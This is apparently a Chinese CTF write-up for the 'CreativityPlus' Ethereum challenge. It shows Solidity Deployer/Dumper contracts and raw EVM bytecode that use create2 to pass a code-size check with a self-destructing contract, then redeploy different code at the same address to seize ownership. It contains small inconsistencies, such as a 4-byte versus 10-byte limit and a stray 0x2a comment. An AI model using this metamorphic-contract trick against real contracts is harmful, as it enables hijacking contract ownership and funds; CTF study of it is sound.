# CreativityPlus

* 题目很简单，改编自 `Creativity` 题目，简称 `CreativityPlus` 升级版
* 考点 `create2` 与 `bytecode`
* 题目逻辑如下：
    * 部署一个合约，大小不超过 `4` 字节
    * 调用 `check` ，参数是我们部署的合约地址
    * 调用 `execute`，使得返回值为 `true`，我们即可成为 `owner`

* 但是我们没法在 `4` 个字节内 `emit SendFlag`
* `create2` 骚操作，使用如下代码可将不同 `bytecode` 部署到同一个地址上，`deployedAddr` 即为部署的合约地址

```
pragma solidity ^0.5.10;

contract Deployer {
    bytes public deployBytecode;
    address public deployedAddr;
    
    function deploy(bytes memory code) public {
        deployBytecode = code;
        address a;
        // Compile Dumper to get this bytecode
        bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe';
        assembly {
            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866)
        }
        deployedAddr = a;
    }
}

contract Dumper {
    constructor() public {
        Deployer dp = Deployer(msg.sender);
        bytes memory bytecode = dp.deployBytecode();
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
    }
}
```

* 所以题目的逻辑如下:
    * 用 `create2` 的骚操作,部署一个合约 `0x33ff` ,即 `selfdestruct(msg.sender)`
    * 调用 `check()` ,让 `target` 为我们部署的合约地址
    * 给我们部署的合约发一笔空交易,让它自毁
    * 再次使用 `create2` 骚操作,在同一个地址部署合约,合约内容大小不超过 `10` 字节，返回 `1`

* 返回值由 `return(p, s)` 操作码处理，但是在返回值之前，必须先存储在内存中，使用 `mstore(p, v)` 将 `1` 存储在内存中
    - 首先，使用 `mstore(p, v)` 将 `1` 存储在内存中，其中 `p` 是在内存中的存储位置， `v` 是十六进制值，`1` 的十六进制是 `0x01`
```
    0x6001     ;PUSH1 0x01                  v
    0x6080     ;PUSH1 0x80                  p
    0x52       ;MSTORE
```
    - 然后，使用 `return(p, s)` 返回 `0x01` ，其中 `p` 是值 `0x2a` 存储的位置，`s` 是值 `0x2a` 存储所占的大小 `0x20` ，占 `32` 字节
```
    0x6020     ;PUSH1 0x20                  s
    0x6080     ;PUSH1 0x80                  p
    0xf3       ;RETURN
```

* 所以我们只需使用 `Deployer.deploy` 部署 `0x600160805260206080f3` 即可，正好 `10 opcodes`
* 调用 `execute` 我们即可成为 `owner`